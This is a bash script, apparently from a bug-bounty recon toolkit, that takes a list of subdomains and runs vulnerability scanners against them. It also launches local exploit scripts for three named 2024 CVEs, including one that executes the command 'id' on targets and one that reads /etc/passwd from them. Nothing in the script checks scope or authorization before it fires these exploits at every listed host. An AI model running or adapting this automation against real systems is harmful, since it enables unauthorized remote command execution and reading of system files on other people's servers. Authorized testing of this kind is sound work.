#!/bin/bash

# Usage: ./cve.sh live_subdomains.txt

if [ $# -ne 1 ]; then
    echo "Usage: $0 <live_subdomains.txt>"
    exit 1
fi

LIVE_SUBDOMAINS="$1"
OUTPUT="cves_out"
mkdir -p "$OUTPUT"


# Colors
GREEN="\033[1;32m"
BLUE="\033[1;34m"
NC="\033[0m"

START=$(date)
echo "Started at: $START"

echo -e "${BLUE}[+] Running nuclei...${NC}"
nuclei -l "$LIVE_SUBDOMAINS" -t cves/ -severity critical,high -o "$OUTPUT/nuclei_output.txt"
nuclei -l "$LIVE_SUBDOMAINS" -t technologies/,cves/,exposed-panels/,misconfiguration/ -o "$OUTPUT/nuclei_output_all.txt"

echo -e "${BLUE}[+] Running scan4all...${NC}"
scan4all -l "$LIVE_SUBDOMAINS" | tee "$OUTPUT/scan4all_output.txt"

echo -e "${BLUE}[+] Running CVE-2024-24919...${NC}"
/home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/CVE-2024-24919.sh -w "$LIVE_SUBDOMAINS" | tee "$OUTPUT/output_2024-24919.txt"

echo -e "${BLUE}[+] Running CVE-2024-4358...${NC}"
python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/cve-2024-4358.py -l "$LIVE_SUBDOMAINS" -c "id" | tee "$OUTPUT/output_2024-4358.txt"

echo -e "${BLUE}[+] Running CVE-2024-9047...${NC}"
/home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/cve-2024-9047.sh "$LIVE_SUBDOMAINS" /etc/passwd | tee "$OUTPUT/out_cve-2024-9047.txt"

echo -e "${BLUE}[+] Running Jaeles scan...${NC}"
cat "$LIVE_SUBDOMAINS" | jaeles scan -c 100 | tee "$OUTPUT/jaeles_output.txt"

echo -e "${BLUE}[+] Running OneForAll...${NC}"
python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/OneForAll/oneforall.py --targets "$LIVE_SUBDOMAINS" run 2>&1 | tee "$OUTPUT/oneforall.txt"

echo -e "${BLUE}[+] Preparing IPs for LazyHunter...${NC}"
while IFS= read -r url; do
  domain=$(echo "$url" | sed -E 's|https?://||')
  dig +short "$domain"
done < "$LIVE_SUBDOMAINS" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' > "$OUTPUT/ips_for_lazy.txt"

echo -e "${BLUE}[+] Running LazyHunter...${NC}"
python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/tools/lazyhunter.py -f "$OUTPUT/ips_for_lazy.txt" | tee -a "$OUTPUT/lazy_output.txt"

echo -e "${GREEN}[✔] All tools executed successfully. Outputs saved in '$OUTPUT/' folder.${NC}"

END=$(date)
echo "Completed at: $END"

